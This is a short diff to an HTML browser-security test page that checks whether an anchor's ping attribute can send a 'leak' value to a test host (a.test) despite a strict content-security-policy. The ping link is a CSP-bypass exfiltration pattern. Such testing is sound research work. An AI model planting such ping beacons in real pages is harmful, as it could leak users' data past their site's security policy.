@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta http-equiv="content-security-policy" content="default-src 'none';">
     <title>Ping Bypass Test</title>
 </head>
 <body>
     <h1>Ping Bypass Test</h1>
     <p>This test checks if the `ping` attribute bypasses CSP.</p>
-    <a href="#done" ping="https://a.test/report/?leak=c560695-GenAI">Click here to exploit</a>
+    <a href="#done" ping="https://a.test/report/?leak=c560695-GenAI-CSP">Click here to exploit</a>
 </body>
 </html>
